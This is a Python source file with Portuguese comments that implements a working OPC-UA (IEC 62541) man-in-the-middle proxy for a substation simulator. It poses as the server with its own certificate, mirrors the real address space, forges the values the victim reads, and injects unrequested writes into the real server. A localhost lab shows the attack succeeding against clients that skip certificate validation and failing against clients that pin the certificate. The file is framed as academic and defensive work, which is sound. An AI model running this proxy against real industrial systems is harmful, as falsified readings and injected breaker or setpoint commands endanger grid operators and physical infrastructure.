"""
Proxy MITM (on-path) para OPC-UA (IEC 62541), por substituicao de certificado.

Diferente do IEC 104 e do DNP3, o OPC-UA TEM seguranca nativa (certificados
X.509, assinatura e criptografia). Nao se "quebra" a criptografia: ataca-se o
MODELO DE CONFIANCA. O proxy nao e um repassador transparente de bytes - ele e
um endpoint OPC-UA COMPLETO dos dois lados:

    vitima  ──(canal com o cert DO PROXY)──►  [ proxy ]  ──(canal com o server real)──►  server real

O proxy se apresenta a vitima como "o servidor", com o SEU proprio certificado,
espelha o Address Space do servidor real e faz a ponte das leituras/subscriptions
(adulterando valores no caminho). Isso funciona SE, E SOMENTE SE, a vitima nao
validar a identidade do servidor (trust-all). Se ela fixa/valida o certificado
do servidor real, o handshake falha e o MITM e derrotado.

Uso academico/defensivo. Alvo: o proprio simulador.
"""

import asyncio
import logging
import random
from pathlib import Path
from typing import Dict, List, Optional

from asyncua import Server, Client, ua
from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256

from .opcua_certs import gerar_todos

logger = logging.getLogger("scada_trafgen.opcua.mitm")

DIM = "\033[90m"; RESET = "\033[0m"; BOLD = "\033[1m"
RED = "\033[31m"; GRN = "\033[32m"; YEL = "\033[33m"; CYA = "\033[36m"; MAG = "\033[35m"


class _MitmSubHandler:
    """Recebe DataChange do servidor real e repassa (adulterado) para o espelho."""

    def __init__(self, mitm: "OPCUAMitm"):
        self.mitm = mitm

    def datachange_notification(self, node, val, data):
        # agenda a atualizacao do no espelhado (o callback e sincrono)
        asyncio.get_event_loop().create_task(self.mitm._on_real_change(node, val))

    def event_notification(self, event):
        pass

    def status_change_notification(self, status):
        pass


class OPCUAMitm:
    """Servidor OPC-UA malicioso que espelha o servidor real e adultera leituras."""

    def __init__(self, real_url: str, listen_endpoint: str,
                 secure: bool = False,
                 proxy_cert: Optional[Path] = None, proxy_key: Optional[Path] = None,
                 real_server_cert: Optional[Path] = None,
                 publishing_interval: float = 500.0):
        self.real_url = real_url
        self.listen_endpoint = listen_endpoint
        self.secure = secure
        self.proxy_cert = proxy_cert
        self.proxy_key = proxy_key
        self.real_server_cert = real_server_cert
        self.publishing_interval = publishing_interval

        self.server: Optional[Server] = None
        self.client: Optional[Client] = None
        self.subscription = None
        self._idx = 0
        # nome -> no espelhado (no nosso servidor malicioso)
        self._mirror: Dict[str, object] = {}
        # nome -> no real (no servidor a montante)
        self._real_nodes: Dict[str, object] = {}
        # nodeid do server real -> nome
        self._real_names: Dict[object, str] = {}
        # nome -> valor forjado (adultera o que a vitima le)
        self.tamper: Dict[str, object] = {}
        self.observe = False
        self._connected = False

    # ------------------------------------------------------------------
    async def _connect_real(self):
        """Cliente para o servidor real (a montante)."""
        self.client = Client(url=self.real_url)
        if self.secure:
            await self.client.set_security(
                SecurityPolicyBasic256Sha256,
                certificate=str(self.proxy_cert),
                private_key=str(self.proxy_key),
                server_certificate=(str(self.real_server_cert)
                                    if self.real_server_cert else None),
                mode=ua.MessageSecurityMode.SignAndEncrypt,
            )
        await self.client.connect()
        self._connected = True

    async def _build_mirror(self):
        """Le o Address Space do servidor real e recria Objects/Subestacao/."""
        objects = self.client.nodes.objects
        subestacao = None
        for filho in await objects.get_children():
            if (await filho.read_browse_name()).Name == "Subestacao":
                subestacao = filho
                break
        if subestacao is None:
            raise RuntimeError("Subestacao nao encontrada no servidor real")

        espelho_obj = await self.server.nodes.objects.add_object(self._idx, "Subestacao")
        for no in await subestacao.get_children():
            nome = (await no.read_browse_name()).Name
            valor = await no.read_value()
            self._real_names[no.nodeid] = nome
            self._real_nodes[nome] = no
            no_esp = await espelho_obj.add_variable(self._idx, nome, valor)
            await no_esp.set_writable()
            self._mirror[nome] = no_esp
        logger.info(f"espelho criado com {len(self._mirror)} nos")

    def node_names(self) -> List[str]:
        """Nomes dos nos espelhados (para o console)."""
        return list(self._mirror.keys())

    async def read_real(self, nome: str):
        """Valor atual de um no NO SERVIDOR REAL (a montante)."""
        no = self._real_nodes.get(nome)
        return await no.read_value() if no is not None else None

    async def _subscribe_real(self):
        """Subscription no servidor real: cada mudanca alimenta o espelho."""
        handler = _MitmSubHandler(self)
        self.subscription = await self.client.create_subscription(
            self.publishing_interval, handler)
        reais = []
        objects = self.client.nodes.objects
        for filho in await objects.get_children():
            if (await filho.read_browse_name()).Name == "Subestacao":
                reais = await filho.get_children()
                break
        await self.subscription.subscribe_data_change(reais)

    async def _on_real_change(self, node, val):
        """Valor mudou no servidor real: escreve no espelho, adulterando se for alvo."""
        nome = self._real_names.get(node.nodeid)
        if nome is None or nome not in self._mirror:
            return
        entregue = self.tamper.get(nome, val)
        try:
            await self._mirror[nome].write_value(entregue)
        except Exception:
            return
        if self.observe:
            if nome in self.tamper:
                print(f"  {MAG}{BOLD}[ADULTERADO]{RESET} {nome}: real={val} "
                      f"-> vitima ve {entregue}")
            else:
                print(f"  {DIM}[repassado] {nome} = {val}{RESET}")

    async def spoof(self, nome: str, valor):
        """Fixa um valor forjado para um no (a vitima passa a ver este valor)."""
        self.tamper[nome] = valor
        if nome in self._mirror:
            try:
                await self._mirror[nome].write_value(valor)
            except Exception:
                pass
        print(f"  {MAG}[spoof] a vitima vera {nome} = {valor}{RESET}")

    async def unspoof(self, nome: str):
        """Remove a adulteracao e restaura o valor real no espelho na hora."""
        self.tamper.pop(nome, None)
        if nome in self._mirror and nome in self._real_nodes:
            try:
                real = await self._real_nodes[nome].read_value()
                await self._mirror[nome].write_value(real)
            except Exception:
                pass

    async def write_real(self, nome: str, valor):
        """Injeta um Write no servidor REAL (sem a vitima pedir)."""
        no = self._real_nodes.get(nome)
        if no is None:
            print(f"  {RED}[!] no '{nome}' nao encontrado{RESET}"); return
        await no.write_value(valor)
        print(f"  {MAG}[write injetado] server real: {nome} = {valor}{RESET}")

    # ------------------------------------------------------------------
    async def start(self):
        """Sobe o servidor malicioso e conecta no real. Levanta se o handshake
        a montante falhar."""
        await self._connect_real()

        self.server = Server()
        await self.server.init()
        self.server.set_endpoint(self.listen_endpoint)
        self.server.set_server_name("PFC SCADA Traffic Generator")
        if self.secure:
            self.server.set_security_policy(
                [ua.SecurityPolicyType.Basic256Sha256_SignAndEncrypt])
            await self.server.load_certificate(str(self.proxy_cert), "DER")
            await self.server.load_private_key(str(self.proxy_key))
        else:
            self.server.set_security_policy([ua.SecurityPolicyType.NoSecurity])

        self._idx = await self.server.register_namespace("http://ime.eb.br/pfc/scada")
        await self._build_mirror()
        await self._subscribe_real()

        await self.server.start()
        pol = "SignAndEncrypt (cert do proxy)" if self.secure else "NoSecurity"
        print(f"{GRN}Proxy MITM OPC-UA ativo em {self.listen_endpoint}{RESET} "
              f"[{pol}]  (upstream: {self.real_url})")

    async def shutdown(self):
        try:
            if self.subscription is not None:
                await asyncio.wait_for(self.subscription.delete(), timeout=2)
        except Exception:
            pass
        try:
            if self.server is not None:
                await asyncio.wait_for(self.server.stop(), timeout=2)
        except Exception:
            pass
        try:
            if self.client is not None:
                await asyncio.wait_for(self.client.disconnect(), timeout=2)
        except Exception:
            pass
        self._connected = False


# =====================================================================
# Laboratorio auto-contido (os 3 casos de seguranca, em localhost, sem VMs).
# Sobe servidor real + proxy + vitima embutida; reconstruivel por politica.
# =====================================================================
LAB_REAL_PORT = 4850
LAB_PROXY_PORT = 4851
LAB_REAL_URL = f"opc.tcp://127.0.0.1:{LAB_REAL_PORT}/scada/server/"
LAB_PROXY_URL = f"opc.tcp://127.0.0.1:{LAB_PROXY_PORT}/scada/server/"

LAB_MODOS = {
    "none": "NoSecurity (sem criptografia) -> MITM transparente",
    "trustall": "SignAndEncrypt, vitima trust-all -> MITM por troca de cert",
    "validate": "SignAndEncrypt, vitima valida o cert -> MITM DERROTADO",
}


class Lab:
    """Laboratorio auto-contido: servidor real + proxy + vitima, reconstruivel
    para cada politica de seguranca."""

    def __init__(self, certs):
        self.certs = certs
        self.real = None
        self.updater = None
        self.mitm: Optional[OPCUAMitm] = None
        self.victim = None
        self.mode = None            # none | trustall | validate
        self.victim_ok = False

    async def _sobe_real(self, secure):
        srv = Server()
        await srv.init()
        srv.set_endpoint(LAB_REAL_URL)
        srv.set_server_name("Servidor Real (subestacao)")
        if secure:
            srv.set_security_policy([ua.SecurityPolicyType.Basic256Sha256_SignAndEncrypt])
            await srv.load_certificate(str(self.certs["server"]["cert"]), "DER")
            await srv.load_private_key(str(self.certs["server"]["key"]))
        else:
            srv.set_security_policy([ua.SecurityPolicyType.NoSecurity])
        idx = await srv.register_namespace("http://ime.eb.br/pfc/scada")
        sub = await srv.nodes.objects.add_object(idx, "Subestacao")
        nos = {}
        for nome, val in (("Disjuntor_1", False), ("Tensao_Barra_A", 138.5),
                          ("Corrente_Fase_1", 420.0), ("Setpoint_Tensao", 138.0)):
            n = await sub.add_variable(idx, nome, val)
            await n.set_writable()
            nos[nome] = n
        await srv.start()
        return srv, nos

    async def _updater_loop(self, nos):
        """Faz os valores reais variarem, para haver trafego vivo."""
        while True:
            await asyncio.sleep(3)
            try:
                await nos["Tensao_Barra_A"].write_value(round(random.uniform(135, 142), 2))
                await nos["Corrente_Fase_1"].write_value(round(random.uniform(380, 460), 1))
            except Exception:
                return

    async def rebuild(self, mode):
        await self.teardown()
        secure = (mode != "none")
        self.real, nos = await self._sobe_real(secure)
        self.updater = asyncio.create_task(self._updater_loop(nos))

        self.mitm = OPCUAMitm(
            real_url=LAB_REAL_URL, listen_endpoint=LAB_PROXY_URL, secure=secure,
            proxy_cert=self.certs["proxy"]["cert"], proxy_key=self.certs["proxy"]["key"],
            real_server_cert=(self.certs["server"]["cert"] if secure else None),
        )
        await self.mitm.start()
        await asyncio.sleep(0.4)

        # vitima conecta PELO PROXY
        self.victim = Client(url=LAB_PROXY_URL)
        if secure:
            await self.victim.set_security(
                SecurityPolicyBasic256Sha256,
                certificate=str(self.certs["client"]["cert"]),
                private_key=str(self.certs["client"]["key"]),
                # 'validate' FIXA o cert do servidor real; 'trustall' passa None
                server_certificate=(str(self.certs["server"]["cert"])
                                    if mode == "validate" else None),
                mode=ua.MessageSecurityMode.SignAndEncrypt,
            )
        try:
            await asyncio.wait_for(self.victim.connect(), timeout=5)
            self.victim_ok = True
        except Exception:
            self.victim_ok = False
            try:
                await asyncio.wait_for(self.victim.disconnect(), timeout=1)
            except Exception:
                pass
            self.victim = None
        self.mode = mode

    async def victim_read(self, nome):
        """Le um no PELA VITIMA (atraves do proxy). None se a vitima nao conectou."""
        if not self.victim_ok or self.victim is None:
            return None
        for f in await self.victim.nodes.objects.get_children():
            if (await f.read_browse_name()).Name == "Subestacao":
                for n in await f.get_children():
                    if (await n.read_browse_name()).Name == nome:
                        return await n.read_value()
        return None

    async def teardown(self):
        if self.updater:
            self.updater.cancel()
            try:
                await self.updater
            except (asyncio.CancelledError, Exception):
                pass
        for coro in (
            self.victim.disconnect() if self.victim else None,
            self.mitm.shutdown() if self.mitm else None,
            self.real.stop() if self.real else None,
        ):
            if coro is not None:
                try:
                    await asyncio.wait_for(coro, timeout=3)
                except (asyncio.CancelledError, Exception):
                    pass
        self.victim = self.mitm = self.real = self.updater = None
        self.victim_ok = False

    @staticmethod
    async def novo(cert_dir: Path) -> "Lab":
        """Gera os certificados de laboratorio e sobe o lab no modo 'none'."""
        certs = await gerar_todos(cert_dir)
        lab = Lab(certs)
        await lab.rebuild("none")
        return lab
